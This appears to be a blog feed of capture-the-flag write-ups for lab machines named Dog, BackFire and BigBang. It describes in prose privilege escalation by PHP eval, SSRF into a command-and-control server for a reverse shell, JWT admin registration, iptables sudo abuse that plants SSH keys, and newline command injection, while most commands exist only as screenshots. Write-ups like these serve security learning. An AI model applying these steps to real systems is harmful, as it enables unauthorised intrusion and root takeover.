<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_23.png" alt="image.png" />
<br /><br />
After checking its flags we found that it allows to execute php eval function
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_24.png" alt="image.png" />
<br /><br />
Immediately we ran <code class="language-plaintext highlighter-rouge">system(”id”)</code> command in the home directory but it didn’t work
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_25.png" alt="image.png" />
<br /><br />
So we checked the status of the installation, and received a message pointing out that the command should be run where the backdrop files are located
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_26.png" alt="image.png" />
<br /><br />
Now it is working
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_27.png" alt="image.png" />
<br /><br />
Root shell is as simple as
<br /><br />
<img src="/assets/images/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e_image_28.png" alt="image.png" />
<br /><br />
Machine pwned!!!@#
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Dog]]></summary></entry><entry><title type="html">BackFire-Linux-Medium</title><link href="https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001.html" rel="alternate" type="text/html" title="BackFire-Linux-Medium" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001.html"><![CDATA[<h1 id="backfire">BackFire</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start enumerating ports, there are two web applications running on it, an a filtered port which could be a clue for potential SSRF
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image.png" alt="image.png" />
<br /><br />
On port 443 there are nothing at first instance
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_1.png" alt="image.png" />
<br /><br />
On 8000 port we can find two files, one that seems to be a havoc configuration file, and other one that is a patch that disables tls
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_2.png" alt="image.png" />
<br /><br />
In this file there are credentials, no we have to find a place to authenticate, we can also notice that a port is shown but is not open at least to public 
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_3.png" alt="image.png" />
<br /><br />
Thanks to colordiff tool we could see better what is removed and added in this patch file
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_4.png" alt="image.png" />
<br /><br />
Havoc is a modern and malleable post-exploitation command and control framework
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_5.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Searching around, there is a CVE that points to something we are looking for
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_6.png" alt="image.png" />
<br /><br />
We need to know how it is working to perform a success attack
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_7.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_8.png" alt="image.png" />
<br /><br />
We need to make it fetch a rev shell in our machine
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_9.png" alt="image.png" />
<br /><br />
Use creds found and as it is a SSRF put the local service on the target machine with its port, this port is disclosed in the patch server where TLS is disable 
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_10.png" alt="image.png" />
<br /><br />
It is performing an injection in the target host updating and executing payload.sh in server team service
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_11.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_12.png" alt="image.png" />
<br /><br />
Now we are ilya, update a public key and sign in using ssh
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_13.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
A clue about a way to escalate privileges, a local service is running 
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_14.png" alt="image.png" />
<br /><br />
A new port in here
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_15.png" alt="image.png" />
<br /><br />
Forward that port
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_16.png" alt="image.png" />
<br /><br />
Now we need a way to bypass this login page
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_17.png" alt="image.png" />
<br /><br />
There is a way crafting a jwt in /login/register path
<br /><br />
But it looks like this path is no available in port 7096
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_18.png" alt="image.png" />
<br /><br />
Another port that is filtered to public but available now is 5000, forward it
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_19.png" alt="image.png" />
<br /><br />
This register endpoint is available in here, use this poc to create a new user with administrative privileges
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_20.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_21.png" alt="image.png" />
<br /><br />
Hardhat is a command and control framework, and has its own shell, we also can see that this shell is run by serge user
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_22.png" alt="image.png" />
<br /><br />
Update your public key in authorized keys file 
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_23.png" alt="image.png" />
<br /><br />
No we are serge
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_24.png" alt="image.png" />
<br /><br />
Enumerating ways to run commands as root, find we have iptables sudo control 
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_25.png" alt="image.png" />
<br /><br />
With a little search we find a way creating a new rule, which will later saved in other file, like /etc/passwd that would be a way to change root password, but this is not allowed in this machine
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_26.png" alt="image.png" />
<br /><br />
So perform this same attack but create a short public key and save it in root authorized keys
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_27.png" alt="image.png" />
<br /><br />
Show rules and Save it to log-in as root
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_28.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001/1c9e9dda-6809-428b-9e5e-c8cbcbd5f697-export-6d66d7ec-a2c6-49c0-98dc-a2e4e0816001_image_29.png" alt="image.png" />
<br /><br />
Machine pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[BackFire]]></summary></entry><entry><title type="html">BigBang-Linux-Hard</title><link href="https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289.html" rel="alternate" type="text/html" title="BigBang-Linux-Hard" /><published>2025-07-16T16:05:57+00:00</published><updated>2025-07-16T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/16/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289.html"><![CDATA[<h1 id="bigbang">BigBang</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
Start enumerating ports, there are only two ports open
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image.png" alt="image.png" />
<br /><br />
Nothing much in port 80
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_1.png" alt="image.png" />
<br /><br />
We can login
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_2.png" alt="image.png" />
<br /><br />
We can also submit a form
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_3.png" alt="image.png" />
<br /><br />
To perform this is used buddyForms
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_4.png" alt="image.png" />
<br /><br />
Use whatweb tool to get more information about this web application, wordpress and php are on it
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_5.png" alt="image.png" />
<br /><br />
Enumerate and map this website using gobuster adding php extension
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_6.png" alt="image.png" />
<br /><br />
This is the same login page that we can be redirected in budyform
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_7.png" alt="image.png" />
<br /><br />
Another endpoint but nothing useful 
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_8.png" alt="image.png" />
<br /><br />
Use wpscan to a more comprehensive about vulnerabilities present
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_9.png" alt="image.png" />
<br /><br />
Buddyforms plugin is present in here
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_10.png" alt="image.png" />
<br /><br />
To know a little more about it search this specific version, it says that we have to be a user with minimal permissions, when we submit a form we can see that we are automatically assigned as guest user which can be enough to attack
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_11.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_12.png" alt="image.png" />
<br /><br />
Download this exploit and follow its instructions to get a rev shell
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_13.png" alt="image.png" />
<br /><br />
We have access to some .php files, search for passwords 
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_14.png" alt="image.png" />
<br /><br />
We have a good sign
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_15.png" alt="image.png" />
<br /><br />
Forward sql port  to access database locally
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_16.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_17.png" alt="image.png" />
<br /><br />
Access to this database
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_18.png" alt="image.png" />
<br /><br />
Before skip ssl
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_19.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_20.png" alt="image.png" />
<br /><br />
We have shawking creds
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_21.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_22.png" alt="image.png" />
<br /><br />
Got the user flags
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_23.png" alt="image.png" />
<br /><br /></p>
<h1 id="3priv-esc">3.Priv esc</h1>
<p><br /><br />
Digging a little bit we found another database, this time a local database
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_24.png" alt="image.png" />
<br /><br />
We can see if we could do something in this grafana service
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_25.png" alt="image.png" />
<br /><br />
Find the right port
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_26.png" alt="image.png" />
<br /><br />
Forward that port
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_27.png" alt="image.png" />
<br /><br />
But nothing useful in here
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_28.png" alt="image.png" />
<br /><br />
Download this local database
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_29.png" alt="image.png" />
<br /><br />
These tables are present
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_30.png" alt="image.png" />
<br /><br />
Developer creds are present
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_31.png" alt="image.png" />
<br /><br />
Use this to make it crackeable
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_32.png" alt="image.png" />
<br /><br />
And crack it
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_33.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_34.png" alt="image.png" />
<br /><br />
Access as developer with this creds
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_35.png" alt="image.png" />
<br /><br />
An application in here, download it locally
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_36.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_37.png" alt="image.png" />
<br /><br />
Use apktool to decompile it to see all we have 
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_38.png" alt="image.png" />
<br /><br />
We are able to execute commands as sudo, but those commands are default ones, even that we also can specify a file where that command will be affect, we can imagine how the task is automated, it should be somethin like sudo ‘default command’ ‘file’, we have control over the file and it is not sanitized which means we could make a line feed to execute another command as root
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_39.png" alt="image.png" />
<br /><br />
get authenticated first 
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_40.png" alt="image.png" />
<br /><br />
You can use this script 
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_41.png" alt="image.png" />
<br /><br />
It looks like it fails
<br /><br />
<img src="/assets/images/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289/1e574c90-14f1-4c4f-918c-d76deb6460d1-export-298d392c-bb32-4e5c-9a03-17e22b88a289_image_42.png" alt="image.png" />
<br /><br />
But if we do this
<br /><br />
<code class="language-plaintext highlighter-rouge">bash -p</code> 
<br /><br />
A shell with root is open and the machine is pwned!!!
<script src="/assets/js/matrix-overlay.js"></script></p>

